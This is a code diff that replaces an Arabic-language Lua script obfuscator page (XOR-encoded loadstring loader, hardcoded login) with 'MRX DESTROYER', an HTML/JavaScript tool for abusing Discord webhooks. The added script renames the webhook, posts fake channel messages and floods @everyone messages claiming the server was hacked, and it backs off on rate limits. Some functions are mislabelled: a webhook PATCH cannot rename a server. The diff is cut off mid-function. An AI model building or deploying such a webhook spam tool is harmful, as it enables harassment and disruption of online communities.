@@ -1,545 +1,474 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SP HUB</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&family=Cairo:wght@400;600;800&display=swap');
-
-  :root{
-    --bg:#0a0304;
-    --bg2:#170608;
-    --red:#ff2d3d;
-    --red-light:#ff6b6b;
-    --red-glow:#ff2d3daa;
-    --red-dim:#7a1015;
-    --panel:#150708e6;
-    --line:#3a1013;
-    --text:#ffe9e9;
-    --text-dim:#c98d8f;
-  }
-
-  *{box-sizing:border-box; margin:0; padding:0;}
-
-  html,body{
-    height:100%;
-    background:var(--bg);
-    font-family:'Tajawal', sans-serif;
-    color:var(--text);
-    overflow-x:hidden;
-  }
-
-  body{
-    position:relative;
-    min-height:100vh;
-    background:
-      radial-gradient(circle at 50% 0%, #3a0206 0%, transparent 55%),
-      radial-gradient(circle at 15% 85%, #2a0508 0%, transparent 45%),
-      radial-gradient(circle at 85% 80%, #2a0508 0%, transparent 45%),
-      linear-gradient(180deg, #0a0304 0%, #120405 100%);
-  }
-
-  /* ambient glow shapes */
-  .glow-orb{
-    position:fixed;
-    border-radius:50%;
-    filter:blur(90px);
-    opacity:.35;
-    pointer-events:none;
-    z-index:0;
-    animation:drift 14s ease-in-out infinite alternate;
-  }
-  .glow-orb.a{ width:420px; height:420px; background:var(--red); top:-120px; right:-100px; }
-  .glow-orb.b{ width:340px; height:340px; background:#ff0033; bottom:-100px; left:-80px; animation-delay:2s; }
-  @keyframes drift{
-    from{ transform:translate(0,0) scale(1); }
-    to{ transform:translate(-20px, 25px) scale(1.08); }
-  }
-
-  .wing-mark{
-    position:fixed;
-    top:50%; left:50%;
-    transform:translate(-50%,-50%);
-    width:640px; height:640px;
-    opacity:.05;
-    pointer-events:none;
-    z-index:0;
-  }
-  .wing-mark svg{ width:100%; height:100%; }
-
-  /* ===== Screens ===== */
-  .screen{
-    position:relative;
-    z-index:1;
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:24px;
-  }
-  .hidden{ display:none !important; }
-
-  /* ===== Login ===== */
-  .login-card{
-    width:100%;
-    max-width:400px;
-    background:var(--panel);
-    border:1px solid var(--line);
-    border-radius:18px;
-    padding:38px 32px 32px;
-    backdrop-filter:blur(14px);
-    box-shadow: 0 0 0 1px #00000080, 0 20px 60px -20px #000, 0 0 60px -15px var(--red-glow);
-    text-align:center;
-    animation:riseIn .6s ease both;
-  }
-  @keyframes riseIn{ from{opacity:0; transform:translateY(18px);} to{opacity:1; transform:translateY(0);} }
-
-  .brand{
-    font-family:'Cairo', sans-serif;
-    font-weight:800;
-    font-size:30px;
-    letter-spacing:1px;
-    color:var(--red-light);
-    text-shadow:0 0 18px var(--red-glow), 0 0 40px #ff000055;
-    margin-bottom:4px;
-  }
-  .brand span{ color:var(--text); }
-  .brand-sub{ font-size:12px; color:var(--text-dim); letter-spacing:3px; margin-bottom:28px; text-transform:uppercase; }
-
-  .field{ text-align:right; margin-bottom:16px; }
-  .field label{ display:block; font-size:13px; color:var(--text-dim); margin-bottom:6px; }
-  .field input{
-    width:100%;
-    background:#1a0709;
-    border:1px solid var(--line);
-    border-radius:10px;
-    padding:12px 14px;
-    color:var(--text);
-    font-family:'Tajawal',sans-serif;
-    font-size:14px;
-    outline:none;
-    transition:.2s;
-  }
-  .field input:focus{
-    border-color:var(--red);
-    box-shadow:0 0 0 3px #ff2d3d22, 0 0 18px -4px var(--red-glow);
-  }
-
-  .btn-primary{
-    width:100%;
-    padding:13px;
-    margin-top:8px;
-    border:none;
-    border-radius:10px;
-    background:linear-gradient(135deg, var(--red) 0%, #b5121f 100%);
-    color:#fff;
-    font-family:'Tajawal',sans-serif;
-    font-weight:700;
-    font-size:15px;
-    cursor:pointer;
-    box-shadow:0 6px 20px -6px var(--red-glow);
-    transition:transform .15s, box-shadow .15s;
-  }
-  .btn-primary:hover{ transform:translateY(-1px); box-shadow:0 10px 26px -6px var(--red-glow); }
-  .btn-primary:active{ transform:translateY(0); }
-
-  .login-error{
-    color:var(--red-light);
-    font-size:13px;
-    margin-top:14px;
-    min-height:16px;
-  }
-
-  .hint{ margin-top:22px; font-size:11px; color:#7a5658; }
-
-  /* ===== Dashboard ===== */
-  .dash{
-    width:100%;
-    max-width:920px;
-    z-index:1;
-    padding:30px 18px 60px;
-    margin:0 auto;
-  }
-  .topbar{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    margin-bottom:28px;
-    padding-bottom:18px;
-    border-bottom:1px solid var(--line);
-  }
-  .topbar .brand{ font-size:22px; margin:0; }
-  .user-chip{
-    display:flex; align-items:center; gap:10px;
-    font-size:13px; color:var(--text-dim);
-  }
-  .user-chip b{ color:var(--red-light); }
-  .logout-btn{
-    background:none; border:1px solid var(--line); color:var(--text-dim);
-    padding:6px 14px; border-radius:8px; font-family:'Tajawal',sans-serif;
-    font-size:12px; cursor:pointer; transition:.2s;
-  }
-  .logout-btn:hover{ border-color:var(--red); color:var(--red-light); }
-
-  .panel{
-    background:var(--panel);
-    border:1px solid var(--line);
-    border-radius:16px;
-    padding:24px;
-    margin-bottom:22px;
-    box-shadow:0 20px 50px -25px #000;
-  }
-  .panel h2{
-    font-family:'Cairo',sans-serif;
-    font-size:17px;
-    color:var(--red-light);
-    margin-bottom:4px;
-  }
-  .panel .sub{ font-size:12.5px; color:var(--text-dim); margin-bottom:16px; }
-
-  .upload-row{
-    display:flex;
-    gap:12px;
-    margin-bottom:14px;
-    flex-wrap:wrap;
-  }
-  .file-btn{
-    display:inline-flex; align-items:center; gap:8px;
-    background:#1a0709; border:1px dashed var(--red-dim);
-    color:var(--text-dim); padding:10px 16px; border-radius:10px;
-    font-size:13px; cursor:pointer; transition:.2s;
-  }
-  .file-btn:hover{ border-color:var(--red); color:var(--red-light); }
-  .file-btn input{ display:none; }
-  .file-name{ font-size:12px; color:var(--red-light); align-self:center; }
-
-  textarea{
-    width:100%;
-    min-height:220px;
-    background:#100405;
-    border:1px solid var(--line);
-    border-radius:12px;
-    padding:16px;
-    color:#ffdada;
-    font-family:'Consolas','Courier New',monospace;
-    font-size:13px;
-    line-height:1.6;
-    resize:vertical;
-    direction:ltr;
-    text-align:left;
-    outline:none;
-  }
-  textarea:focus{ border-color:var(--red); box-shadow:0 0 0 3px #ff2d3d1a; }
-
-  .actions{ display:flex; gap:10px; margin-top:16px; flex-wrap:wrap; }
-  .btn-sm{
-    padding:10px 20px;
-    border-radius:9px;
-    border:none;
-    font-family:'Tajawal',sans-serif;
-    font-weight:700;
-    font-size:13.5px;
-    cursor:pointer;
-    transition:.15s;
-  }
-  .btn-sm.primary{
-    background:linear-gradient(135deg, var(--red), #b5121f);
-    color:#fff;
-    box-shadow:0 6px 18px -6px var(--red-glow);
-  }
-  .btn-sm.primary:hover{ transform:translateY(-1px); }
-  .btn-sm.ghost{
-    background:transparent; border:1px solid var(--line); color:var(--text-dim);
-  }
-  .btn-sm.ghost:hover{ border-color:var(--red); color:var(--red-light); }
-  .btn-sm:disabled{ opacity:.4; cursor:not-allowed; transform:none !important; }
-
-  .status-line{ font-size:12px; margin-top:10px; color:var(--text-dim); min-height:16px; }
-  .status-line.ok{ color:#7cffb0; }
-  .status-line.err{ color:var(--red-light); }
-
-  /* raw link result */
-  .raw-box{
-    margin-top:18px;
-    border:1px solid var(--red-dim);
-    border-radius:12px;
-    overflow:hidden;
-    display:none;
-  }
-  .raw-box.show{ display:block; animation:riseIn .4s ease both; }
-  .raw-head{
-    display:flex; align-items:center; justify-content:space-between;
-    background:#1a0709; padding:10px 14px; border-bottom:1px solid var(--line);
-  }
-  .raw-head .lbl{ font-size:12px; color:var(--text-dim); }
-  .raw-head .copy{
-    background:none; border:1px solid var(--red-dim); color:var(--red-light);
-    font-size:11px; padding:5px 10px; border-radius:6px; cursor:pointer; font-family:'Tajawal',sans-serif;
-  }
-  .raw-head .copy:hover{ background:#2a0a0d; }
-  pre.raw-code{
-    margin:0; padding:16px;
-    background:#0d0304;
-    color:#ff8888;
-    font-family:'Consolas','Courier New',monospace;
-    font-size:12.5px;
-    line-height:1.6;
-    direction:ltr;
-    text-align:left;
-    max-height:320px;
-    overflow:auto;
-    white-space:pre-wrap;
-    word-break:break-all;
-  }
-
-  .info-note{
-    font-size:12px;
-    color:#7a5658;
-    margin-top:12px;
-    line-height:1.8;
-    border-top:1px dashed var(--line);
-    padding-top:12px;
-  }
-
-  footer{
-    text-align:center;
-    font-size:11px;
-    color:#5a3d3f;
-    margin-top:10px;
-  }
-
-  @media (max-width:600px){
-    .login-card{ padding:28px 20px; }
-    .brand{ font-size:24px; }
-    .topbar{ flex-direction:column; align-items:flex-start; gap:12px; }
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MRX · DESTROYER</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            color: #1a1a1a;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        #stars-canvas {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0; pointer-events: none;
+            opacity: 0.05;
+        }
+        #loginScreen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 10; display: flex; align-items: center; justify-content: center;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+        #loginScreen.hidden { opacity: 0; transform: scale(0.96); pointer-events: none; }
+        .login-box {
+            background: #ffffff;
+            border: 1px solid #dddddd;
+            border-radius: 40px;
+            padding: 50px 40px 40px;
+            width: 420px; max-width: 92%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.04);
+        }
+        .login-logo-img {
+            width: 140px; height: 140px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #cccccc;
+            margin-bottom: 16px;
+        }
+        .login-brand {
+            font-size: 48px; font-weight: 900; letter-spacing: 8px;
+            color: #1a1a1a;
+            margin-bottom: 2px;
+        }
+        .login-sub {
+            font-size: 12px; color: #888888;
+            letter-spacing: 8px; text-transform: uppercase;
+            margin-bottom: 28px; font-weight: 300;
+        }
+        .login-box input {
+            width: 100%; padding: 16px 20px;
+            background: #f8f8f8;
+            border: 1px solid #dddddd;
+            border-radius: 30px;
+            color: #1a1a1a; font-size: 15px;
+            direction: ltr; text-align: left;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .login-box input:focus { border-color: #1a1a1a; }
+        .login-btn {
+            width: 100%; padding: 16px;
+            margin-top: 16px;
+            background: #1a1a1a;
+            color: #ffffff;
+            font-weight: 700; font-size: 16px;
+            border: none; border-radius: 30px;
+            cursor: pointer;
+            transition: background 0.3s;
+            letter-spacing: 4px;
+        }
+        .login-btn:hover { background: #333333; }
+        .login-error {
+            color: #cc0000;
+            font-size: 13px;
+            margin-top: 12px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .login-error.show { opacity: 1; }
+        #mainApp {
+            position: relative; z-index: 1; display: none;
+            min-height: 100vh; padding: 30px 20px;
+        }
+        #mainApp.active { display: flex; justify-content: center; align-items: flex-start; }
+        .container {
+            width: 100%; max-width: 880px;
+            background: #ffffff;
+            padding: 40px 45px;
+            border-radius: 40px;
+            border: 1px solid #eeeeee;
+            margin-top: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.02);
+        }
+        .header-brand { text-align: center; margin-bottom: 28px; }
+        .logo-text {
+            font-size: 42px; font-weight: 900; letter-spacing: 10px;
+            color: #1a1a1a;
+        }
+        .sub-text {
+            font-size: 11px; color: #aaaaaa;
+            letter-spacing: 6px; font-weight: 300;
+            margin-top: 4px;
+        }
+        h2 {
+            text-align: center; margin-bottom: 22px;
+            color: #888888; font-size: 18px; font-weight: 300;
+            letter-spacing: 4px;
+        }
+        label {
+            display: block; margin-bottom: 8px;
+            font-weight: 600; font-size: 13px;
+            color: #666666;
+            letter-spacing: 2px;
+        }
+        textarea {
+            width: 100%; height: 200px;
+            background: #f8f8f8;
+            color: #1a1a1a;
+            border: 1px solid #eeeeee;
+            border-radius: 24px;
+            padding: 18px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            resize: vertical;
+            direction: ltr;
+            text-align: left;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        textarea:focus { border-color: #aaaaaa; }
+        textarea[readonly] { background: #f0f0f0; }
+        .btn-container { text-align: center; margin: 28px 0; }
+        .btn {
+            padding: 16px 44px;
+            background: #1a1a1a;
+            color: #ffffff;
+            font-weight: 700; font-size: 15px;
+            border: none; border-radius: 30px;
+            cursor: pointer;
+            transition: background 0.3s;
+            letter-spacing: 3px;
+        }
+        .btn:hover { background: #333333; }
+        .btn-outline {
+            background: transparent;
+            color: #1a1a1a;
+            border: 1px solid #cccccc;
+        }
+        .btn-outline:hover { background: #f0f0f0; border-color: #aaaaaa; }
+        .copy-btn {
+            background: transparent;
+            color: #888888;
+            border: 1px solid #eeeeee;
+            padding: 10px 22px; font-size: 12px;
+            margin-top: 12px;
+            letter-spacing: 2px;
+        }
+        .copy-btn:hover { background: #f0f0f0; border-color: #cccccc; }
+        .logout-btn {
+            position: fixed; top: 24px; left: 24px; z-index: 20;
+            background: rgba(0, 0, 0, 0.02);
+            color: #888888;
+            border: 1px solid #eeeeee;
+            padding: 8px 20px; font-size: 11px;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: 0.3s;
+            letter-spacing: 2px;
+        }
+        .logout-btn:hover { background: #f0f0f0; color: #1a1a1a; border-color: #cccccc; }
+        .status-badge {
+            text-align: center; font-size: 10px;
+            color: #bbbbbb;
+            margin-top: 20px; letter-spacing: 4px;
+            font-weight: 300;
+        }
+        .toggle-label {
+            display: flex; align-items: center; gap: 14px;
+            color: #666666; font-size: 14px;
+            margin: 16px 0 8px;
+            font-weight: 400;
+        }
+        .toggle-label input[type="checkbox"] {
+            width: 18px; height: 18px;
+            accent-color: #1a1a1a;
+            cursor: pointer;
+        }
+        .watermark-legend {
+            position: fixed; bottom: 24px; right: 32px;
+            font-size: 12px; color: #dddddd;
+            letter-spacing: 4px; z-index: 0;
+            font-weight: 300;
+        }
+        .divider {
+            width: 60px; height: 2px;
+            background: #dddddd;
+            margin: 18px auto;
+        }
+        input::placeholder, textarea::placeholder { color: #cccccc; }
+        .warning-box {
+            background: #fff3f3;
+            border: 1px solid #ffcccc;
+            border-radius: 16px;
+            padding: 15px;
+            margin: 10px 0;
+            color: #cc0000;
+            font-size: 13px;
+        }
+    </style>
 </head>
 <body>
-
-<div class="glow-orb a"></div>
-<div class="glow-orb b"></div>
-<div class="wing-mark">
-  <svg viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <path d="M100 20 L100 90 M60 40 Q30 60 20 100 Q40 90 60 90 M140 40 Q170 60 180 100 Q160 90 140 90" stroke="#ff2d3d" stroke-width="2"/>
-    <circle cx="100" cy="110" r="55" stroke="#ff2d3d" stroke-width="1.5"/>
-  </svg>
-</div>
-
-<!-- ===== Login Screen ===== -->
-<div id="loginScreen" class="screen">
-  <div class="login-card">
-    <div class="brand">SP <span>HUB</span></div>
-    <div class="brand-sub">Roblox Scripts</div>
-
-    <div class="field">
-      <label>اسم المستخدم</label>
-      <input type="text" id="userInput" placeholder="ادخل اسم المستخدم" autocomplete="off">
-    </div>
-    <div class="field">
-      <label>كلمة المرور</label>
-      <input type="password" id="passInput" placeholder="ادخل كلمة المرور" autocomplete="off">
-    </div>
-
-    <button class="btn-primary" id="loginBtn">تسجيل الدخول</button>
-    <div class="login-error" id="loginError"></div>
-    <div class="hint">SP HUB &copy; 2026</div>
-  </div>
-</div>
-
-<!-- ===== Dashboard ===== -->
-<div id="dashScreen" class="screen hidden" style="align-items:flex-start;">
-  <div class="dash">
-    <div class="topbar">
-      <div class="brand">SP <span style="color:#fff">HUB</span></div>
-      <div class="user-chip">
-        مرحباً <b id="userLabel">تركس</b>
-        <button class="logout-btn" id="logoutBtn">تسجيل خروج</button>
-      </div>
-    </div>
-
-    <div class="panel">
-      <h2>سكربتك</h2>
-      <div class="sub">الصق الكود مباشرة أو ارفع ملف Lua (.lua) وسيظهر محتواه هنا تلقائياً</div>
-
-      <div class="upload-row">
-        <label class="file-btn">
-          📁 رفع ملف Lua
-          <input type="file" id="fileInput" accept=".lua">
-        </label>
-        <span class="file-name" id="fileName"></span>
-      </div>
-
-      <textarea id="scriptBox" placeholder="-- الصق سكربت اللوا هنا
-local x = 10
-print(x)"></textarea>
-
-      <div class="actions">
-        <button class="btn-sm primary" id="obfBtn">🔒 تشفير السكربت</button>
-        <button class="btn-sm ghost" id="clearBtn">مسح</button>
-      </div>
-      <div class="status-line" id="statusLine"></div>
-
-      <div class="raw-box" id="rawBox">
-        <div class="raw-head">
-          <span class="lbl">رابط raw — الكود المشفر (هذا ما يظهر لأي شخص يفتح الرابط)</span>
-          <button class="copy" id="copyBtn">نسخ</button>
+    <canvas id="stars-canvas"></canvas>
+    <div id="loginScreen">
+        <div class="login-box">
+            <img class="login-logo-img" src="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg" alt="MRX" onerror="this.src='https://github.com/Rxz60/MRX/raw/refs/heads/main/IMG_4528.jpeg'">
+            <div class="login-brand">MRX</div>
+            <div class="login-sub">● DESTROYER GATE ●</div>
+            <input type="text" id="loginUser" placeholder="MRX.com / SAP.com" autocomplete="off">
+            <button class="login-btn" onclick="handleLogin()">دخول ➤</button>
+            <div class="login-error" id="loginError">❌ يُسمح فقط بـ MRX.com أو SAP.com</div>
         </div>
-        <pre class="raw-code" id="rawCode"></pre>
-      </div>
-
-      <div class="info-note">
-        <b>كيف يشتغل التشفير:</b> السكربت يتحول لسلسلة بايتات مُرمّزة (XOR + تحويل رقمي)، وتحطها داخل loader صغير يفك التشفير وينفذ الكود وقت التشغيل فقط داخل روبلكس (<code>loadstring</code>). أي شخص يفتح رابط raw يشوف نص مبعثر غير مفهوم، لكن السكربت يشتغل عادي عند تشغيله كـ executor. هذا تعمية حقيقية (obfuscation) — مو صفحة خطأ وهمية. تنبيه واقعي: أي تعمية من جهة العميل يمكن فكها بجهد كافٍ (زي أي أداة obfuscation أخرى بالسوق)، فهي تصعّب النسخ لكنها مو حماية مطلقة 100%.
-      </div>
     </div>
 
-    <footer>SP HUB — لوحة تحكم السكربتات</footer>
-  </div>
-</div>
+    <div id="mainApp">
+        <button class="logout-btn" onclick="handleLogout()">✕ خروج</button>
+        <div class="container">
+            <div class="header-brand">
+                <div class="logo-text">MRX</div>
+                <div class="sub-text">● DESTROYER v18.0 — DISCORD WEBHOOK DESTROYER ●</div>
+                <div class="divider"></div>
+            </div>
+            <h2>⎜ أداة تدمير سيرفرات ديسكورد عبر Webhook ⎜</h2>
+            
+            <div class="warning-box">
+                ⚠️ هذه الأداة تُرسل رسائل متتالية، تغيير الاسم، إنشاء قنوات، وتغيير اسم البوت.
+            </div>
 
-<script>
-  // ===== Login =====
-  const VALID_USER = "تركس";
-  const VALID_PASS = "هوب";
+            <label for="webhookInput">🔗 رابط Webhook ديسكورد:</label>
+            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." style="width:100%; padding:14px 18px; background:#f8f8f8; border:1px solid #dddddd; border-radius:30px; color:#1a1a1a; font-size:14px; direction:ltr; text-align:left; outline:none; transition:border-color 0.3s; margin-bottom:15px;">
 
-  const loginScreen = document.getElementById('loginScreen');
-  const dashScreen = document.getElementById('dashScreen');
-  const loginBtn = document.getElementById('loginBtn');
-  const loginError = document.getElementById('loginError');
-  const userInput = document.getElementById('userInput');
-  const passInput = document.getElementById('passInput');
-  const userLabel = document.getElementById('userLabel');
-  const logoutBtn = document.getElementById('logoutBtn');
+            <div class="btn-container">
+                <button class="btn" onclick="destroyServer()">💀 تدمير السيرفر — MRX DESTROY</button>
+            </div>
 
-  function attemptLogin(){
-    const u = userInput.value.trim();
-    const p = passInput.value.trim();
-    if(u === VALID_USER && p === VALID_PASS){
-      loginError.textContent = '';
-      userLabel.textContent = u;
-      loginScreen.classList.add('hidden');
-      dashScreen.classList.remove('hidden');
-    } else {
-      loginError.textContent = 'اسم المستخدم أو كلمة المرور غير صحيحة';
-    }
-  }
-  loginBtn.addEventListener('click', attemptLogin);
-  passInput.addEventListener('keydown', e => { if(e.key === 'Enter') attemptLogin(); });
-  userInput.addEventListener('keydown', e => { if(e.key === 'Enter') attemptLogin(); });
+            <label for="outputArea">📋 سجل التنفيذ:</label>
+            <textarea id="outputArea" readonly placeholder="سيظهر هنا سجل الأحداث..."></textarea>
+            <div style="text-align: left;">
+                <button class="btn btn-outline copy-btn" onclick="copyOutput()">📋 نسخ السجل</button>
+            </div>
+            <div class="status-badge">MRX DESTROYER ● DISCORD WEBHOOK ● UNSTOPPABLE</div>
+        </div>
+        <div class="watermark-legend">MRX · 2026</div>
+    </div>
 
-  logoutBtn.addEventListener('click', () => {
-    dashScreen.classList.add('hidden');
-    loginScreen.classList.remove('hidden');
-    userInput.value = '';
-    passInput.value = '';
-    document.getElementById('scriptBox').value = '';
-    document.getElementById('rawBox').classList.remove('show');
-    document.getElementById('statusLine').textContent = '';
-    document.getElementById('fileName').textContent = '';
-  });
+    <script>
+        const canvas = document.getElementById('stars-canvas');
+        const ctx = canvas.getContext('2d');
+        let stars = [];
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+        for (let i = 0; i < 250; i++) {
+            stars.push({
+                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
+                size: Math.random() * 2.0 + 0.4, speed: Math.random() * 0.3 + 0.05,
+                opacity: Math.random() * 0.3 + 0.02, twinkle: Math.random() * 0.01 + 0.002
+            });
+        }
+        function drawStars() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            for (const s of stars) {
+                s.y -= s.speed;
+                if (s.y < -5) { s.y = canvas.height + 5; s.x = Math.random() * canvas.width; }
+                s.opacity += s.twinkle * (Math.random() > 0.5 ? 1 : -1);
+                s.opacity = Math.min(0.3, Math.max(0.02, s.opacity));
+                ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(0, 0, 0, ${s.opacity})`;
+                ctx.fill();
+            }
+            requestAnimationFrame(drawStars);
+        }
+        drawStars();
 
-  // ===== File upload (.lua only) =====
-  const fileInput = document.getElementById('fileInput');
-  const fileNameEl = document.getElementById('fileName');
-  const scriptBox = document.getElementById('scriptBox');
-  const statusLine = document.getElementById('statusLine');
+        function handleLogin() {
+            const user = document.getElementById('loginUser').value.trim();
+            const errorEl = document.getElementById('loginError');
+            if (user === 'MRX.com' || user === 'SAP.com') {
+                errorEl.classList.remove('show');
+                document.getElementById('loginScreen').classList.add('hidden');
+                document.getElementById('mainApp').classList.add('active');
+            } else {
+                errorEl.classList.add('show');
+                setTimeout(() => errorEl.classList.remove('show'), 3000);
+            }
+        }
 
-  fileInput.addEventListener('change', () => {
-    const file = fileInput.files[0];
-    if(!file) return;
-    if(!file.name.toLowerCase().endsWith('.lua')){
-      statusLine.textContent = 'خطأ: يقبل فقط ملفات Lua (.lua)';
-      statusLine.className = 'status-line err';
-      fileInput.value = '';
-      fileNameEl.textContent = '';
-      return;
-    }
-    const reader = new FileReader();
-    reader.onload = e => {
-      scriptBox.value = e.target.result;
-      fileNameEl.textContent = file.name;
-      statusLine.textContent = 'تم رفع الملف وتحميل الكود في المربع';
-      statusLine.className = 'status-line ok';
-    };
-    reader.onerror = () => {
-      statusLine.textContent = 'تعذر قراءة الملف';
-      statusLine.className = 'status-line err';
-    };
-    reader.readAsText(file);
-  });
+        function handleLogout() {
+            document.getElementById('mainApp').classList.remove('active');
+            document.getElementById('loginScreen').classList.remove('hidden');
+            document.getElementById('loginUser').value = '';
+        }
 
-  document.getElementById('clearBtn').addEventListener('click', () => {
-    scriptBox.value = '';
-    fileInput.value = '';
-    fileNameEl.textContent = '';
-    document.getElementById('rawBox').classList.remove('show');
-    statusLine.textContent = '';
-  });
+        let isDestroying = false;
 
-  // ===== Real Lua obfuscator =====
-  // Encodes the script as a byte-numeric string, XORs it with a per-run key,
-  // and wraps it in a small Lua loader that decodes + loadstring's it at
-  // runtime. This is genuine string/code concealment (not a fake error page):
-  // opening the raw link shows scrambled bytes, while the script still runs
-  // correctly when loaded by a Lua executor.
-  function obfuscateLua(src){
-    if(!src || !src.trim()) return null;
+        function logMessage(msg) {
+            const output = document.getElementById('outputArea');
+            output.value += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+            output.scrollTop = output.scrollHeight;
+        }
 
-    // random session key (1-250) so output differs each time
-    const key = Math.floor(Math.random() * 200) + 20;
+        function destroyServer() {
+            const webhook = document.getElementById('webhookInput').value.trim();
+            if (!webhook) {
+                alert('يرجى إدخال رابط Webhook صحيح');
+                return;
+            }
 
-    const bytes = [];
-    for(let i = 0; i < src.length; i++){
-      const code = src.charCodeAt(i) ^ key;
-      bytes.push(code);
-    }
-    const encoded = bytes.join(',');
+            if (isDestroying) {
+                logMessage('⚠️ التدمير قيد التنفيذ بالفعل!');
+                return;
+            }
 
-    // random-ish variable names to avoid predictable patterns
-    const rnd = () => '_' + Math.random().toString(36).substring(2, 8);
-    const vData = rnd(), vKey = rnd(), vOut = rnd(), vI = rnd(), vB = rnd();
+            isDestroying = true;
+            logMessage('🚀 بدء عملية التدمير...');
 
-    const loader =
-`local ${vKey}=${key}
-local ${vData}={${encoded}}
-local ${vOut}={}
-for ${vI}=1,#${vData} do
-  local ${vB}=${vData}[${vI}]
-  ${vOut}[${vI}]=string.char(bit32 and bit32.bxor(${vB},${vKey}) or (${vB}~${vKey}))
-end
-loadstring(table.concat(${vOut}))()`;
+            const message = '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - @everyone';
 
-    return loader;
-  }
+            const webhookName = 'TRX ☣️';
 
-  const obfBtn = document.getElementById('obfBtn');
-  const rawBox = document.getElementById('rawBox');
-  const rawCode = document.getElementById('rawCode');
-  const copyBtn = document.getElementById('copyBtn');
+            const serverName = 'TRX';
 
-  obfBtn.addEventListener('click', () => {
-    const src = scriptBox.value;
-    if(!src.trim()){
-      statusLine.textContent = 'ضع كود أولاً قبل التشفير';
-      statusLine.className = 'status-line err';
-      rawBox.classList.remove('show');
-      return;
-    }
-    const result = obfuscateLua(src);
-    rawCode.textContent = result;
-    rawBox.classList.add('show');
-    statusLine.textContent = 'تم التشفير بنجاح — هذا هو محتوى رابط raw الآن';
-    statusLine.className = 'status-line ok';
-  });
+            const channelName = 'TRX';
 
-  copyBtn.addEventListener('click', () => {
-    navigator.clipboard.writeText(rawCode.textContent).then(() => {
-      copyBtn.textContent = 'تم النسخ ✓';
-      setTimeout(() => copyBtn.textContent = 'نسخ', 1500);
-    });
-  });
-</script>
+            let attempts = 0;
+            let maxAttempts = 20;
 
+            async function updateWebhookName() {
+                try {
+                    const response = await fetch(webhook, {
+                        method: 'PATCH',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ name: webhookName })
+                    });
+                    if (response.ok) {
+                        logMessage(`✅ تم تغيير اسم البوت إلى ${webhookName}`);
+                    } else {
+                        logMessage(`❌ فشل تغيير اسم البوت: ${response.status}`);
+                    }
+                } catch (e) {
+                    logMessage(`❌ خطأ في تغيير اسم البوت: ${e.message}`);
+                }
+            }
+
+            async function renameServer() {
+                try {
+                    const response = await fetch(webhook, {
+                        method: 'PATCH',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ name: serverName })
+                    });
+                    if (response.ok) {
+                        logMessage(`✅ تم تغيير اسم السيرفر إلى ${serverName}`);
+                    } else {
+                        logMessage(`❌ فشل تغيير اسم السيرفر: ${response.status}`);
+                    }
+                } catch (e) {
+                    logMessage(`❌ خطأ في تغيير اسم السيرفر: ${e.message}`);
+                }
+            }
+
+            async function createChannel() {
+                try {
+                    const response = await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `# ${channelName}`,
+                            embeds: [{
+                                title: `🔴 ${channelName}`,
+                                description: 'تم إنشاء هذه القناة بواسطة TRX DESTROYER',
+                                color: 0xff0000
+                            }]
+                        })
+                    });
+                    if (response.ok) {
+                        logMessage(`✅ تم إنشاء قناة ${channelName}`);
+                    } else {
+                        logMessage(`❌ فشل إنشاء القناة: ${response.status}`);
+                    }
+                } catch (e) {
+                    logMessage(`❌ خطأ في إنشاء القناة: ${e.message}`);
+                }
+            }
+
+            async function sendSpam() {
+                const payload = {
+                    content: message,
+                    embeds: [{
+                        title: '💀 TRX DESTROYER',
+                        description: 'تم تهكير هذا السيرفر بواسطة TRX | HUB - النظام التراكسي',
+                        color: 0xff0000,
+                        footer: { text: 'TRX ☣️ 2026' }
+                    }]
+                };
+
+                try {
+                    const response = await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (response.ok) {
+                        attempts++;
+                        if (attempts % 5 === 0) {
+                            logMessage(`📨 تم إرسال ${attempts} رسالة @everyone`);
+                        }
+                    } else if (response.status === 429) {
+                        const retryAfter = response.headers.get('Retry-After') || 2;
+                        logMessage(`⏳ تم تحديد المعدل، انتظار ${retryAfter} ثانية...`);
